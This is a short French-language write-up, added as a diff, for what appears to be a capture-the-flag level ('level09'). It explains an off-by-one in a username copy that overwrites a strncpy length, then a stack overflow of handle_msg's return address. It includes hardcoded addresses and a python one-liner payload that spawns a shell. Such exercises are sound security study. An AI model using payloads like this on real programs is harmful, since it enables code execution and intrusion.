@@ -1,0 +1,25 @@
+Idée : exploiter une for loop qui incrémente une fois de trop pour modifier la length d'un strncpy et réécrire ou l'on veut
+
+
+On comprend que dans la mémoire, à partir de buffer, on a :
+  0 -> 140 = message (a partir du strncpy de set_msg)
+140 -> 180 = username
+180 -> 188 (taille dun long) = length du message a copier dans buffer
+
+FAILLE :
+Username : les 41 premiers caractères sont copiés dans la structure qui part de buffer:
+01234567890123456789012345678901234567890
+Alors que la taille allouée à username est 40
+
+En modifiant length, on peut donc réécrire aussi loin qu'on veut à partir de buffer (max 1024)
+
+
+
+réécrire l'EIP de handle_msg situé après 200 caractères
+
+
+Adresse de secret_backdoor = 0x000055555555488c "\x8c\x48\x55\x55\x55\x55\x00\x00"
+Adresse de '/bin/sh'       = 0x00007ffff7b94d0f "\x0f\x4d\xb9\xf7\xff\x7f\x00\x00"
+
+
+(python -c 'print "A"*40 + "\xfa"'; python -c 'print "B"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "x80\x75\xa5\xf7\xff\x7f\x00\x00"' ; cat) | ./level09
